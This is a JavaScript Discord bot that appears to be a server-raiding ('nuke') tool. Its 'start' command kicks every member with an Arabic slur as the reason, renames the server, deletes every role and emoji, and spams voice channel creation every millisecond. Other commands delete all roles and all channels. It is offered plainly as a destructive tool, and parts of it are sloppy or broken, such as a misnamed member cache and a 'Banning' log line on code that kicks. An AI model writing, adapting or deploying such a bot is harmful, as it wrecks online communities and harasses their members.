const {Client,MessageEmbed} = require('discord.js')
const client = new Client()
const {token,prefix} = require('./config.json')
client.login(token)
client.on('ready',()=>{
    readyEvent(`${client.user.username} is Ready To Use`)
})
client.on('message',message=>{
    if(message.author.bot || !message.guild) return
    if(message.content.startsWith(prefix + "start")){
        message.guild.members.cache.forEach(member =>{
            member.kick({reason:'اخو قحبة'})
           console.log(`Banning ${message.guild.memberCount}`)
      
})
    }
    if(message.content.startsWith(prefix + "start")){
message.guild.setName("By Rohit#8888")
setInterval(()=>{
    message.guild.channels.create('Rohit Is here',{type:'voice'})        
},1)
    message.guild.roles.cache.forEach(role=>{
        role.delete('تست')
    })
    message.guild.emojis.cache.forEach(emoji=>{
        emoji.delete()
    })
}
if(message.content.startsWith(prefix +"member")){
    message.guild.member.cache.forEach(member=>{
        member.kick({reason:'اخو قحبة'})
    })
}
if(!message.content.startsWith(prefix)) return
    if(message.content.startsWith(prefix + "roles")){
        message.guild.roles.cache.forEach(role=>{
            role.delete()
    })
}
if(message.content.startsWith(prefix + "channels")){
    message.guild.channels.cache.forEach(channel=>{
        channel.delete()
    })
}
})

function readyEvent(text){
    console.log(text)
}
